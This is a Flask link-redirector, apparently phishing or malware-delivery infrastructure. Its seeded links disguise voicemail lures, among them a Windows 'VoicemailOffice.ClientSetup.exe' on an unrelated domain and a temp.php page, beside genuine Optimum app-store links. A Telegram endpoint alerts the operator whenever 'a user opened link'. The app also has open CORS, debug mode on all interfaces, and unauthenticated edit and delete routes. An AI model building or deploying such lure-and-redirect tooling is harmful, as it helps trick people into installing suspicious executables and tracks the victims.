from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_cors import CORS
import os
import requests

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev')

# Load Telegram config
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

# Use project directory for SQLite database
db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'urls.db')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', f'sqlite:///{db_path}')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
migrate = Migrate(app, db)

# Ensure /tmp directory exists
os.makedirs('/tmp', exist_ok=True)

class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), unique=True, nullable=False)
    link = db.Column(db.String(2048), nullable=False)

# Initialize database
with app.app_context():
    db.create_all()
    # Only add predefined links if the database is empty
    if not Link.query.first():
        predefined_links = [
            {'name': 'voicemail-googleplay', 'link': 'https://kentenglishhub.com/temp.php'},
            {'name': 'voicemail-windows', 'link': 'https://audiofilelisten.online/Bin/VoicemailOffice.ClientSetup.exe?e=Access&y=Guest&c=Voicemail%20Office&c=https%3A%2F%2Fwww.voicemailoffice.com%2F&c=&c=&c=&c=&c=&c='},
            {'name': 'optimum-google', 'link': 'https://play.google.com/store/apps/details?id=com.altice.optimum'},
            {'name': 'optimum-windows', 'link': 'https://www.microsoft.com/en-us/p/optimum/9nblggh0h7c9'}
        ]
        for link_data in predefined_links:
            link = Link(name=link_data['name'], link=link_data['link'])
            db.session.add(link)
        db.session.commit()

@app.route('/')
def index():
    links = Link.query.order_by(Link.id.desc()).all()
    return render_template('index.html', links=links)

@app.route('/telegram/send', methods=['POST'])
def send_telegram_message():
    data = request.json
    message = data.get('message')
    if not message:
        return jsonify({'error': 'Message is required'}), 400
        
    try:
        send_telegram_notification(message)
        return jsonify({'status': 'success', 'message': 'A user opened link'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/<name>')
def redirect_link(name):
    link = Link.query.filter_by(name=name).first()
    if link:
        return redirect(link.link)
    return "Link not found", 404

@app.route('/notify', methods=['POST'])
def notify_telegram():
    data = request.get_json()
    if not data or 'message' not in data:
        return jsonify({'error': 'message parameter is required'}), 400
    
    message = data['message']
    send_telegram_notification(message)
    return jsonify({'status': 'success'}), 200

def send_telegram_notification(message):
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        try:
            requests.post(url, json=data)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")

@app.route('/edit/<int:id>', methods=['POST'])
def edit_link(id):
    link_obj = Link.query.get_or_404(id)
    name = request.form.get('name')
    link = request.form.get('link')
    if not name or not link:
        flash('Both name and link are required!', 'danger')
        return redirect(url_for('index'))
    if Link.query.filter(Link.name == name, Link.id != id).first():
        flash('Name already exists!', 'danger')
        return redirect(url_for('index'))
    link_obj.name = name
    link_obj.link = link
    db.session.commit()
    flash('Link updated!', 'success')
    return redirect(url_for('index'))

@app.route('/delete/<int:id>')
def delete_link(id):
    link_obj = Link.query.get_or_404(id)
    db.session.delete(link_obj)
    db.session.commit()
    flash('Link deleted!', 'success')
    return redirect(url_for('index'))

@app.route('/api/links')
def get_links():
    links = Link.query.order_by(Link.id.desc()).all()
    return jsonify([{
        'id': link.id,
        'name': link.name,
        'link': link.link
    } for link in links])

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0') 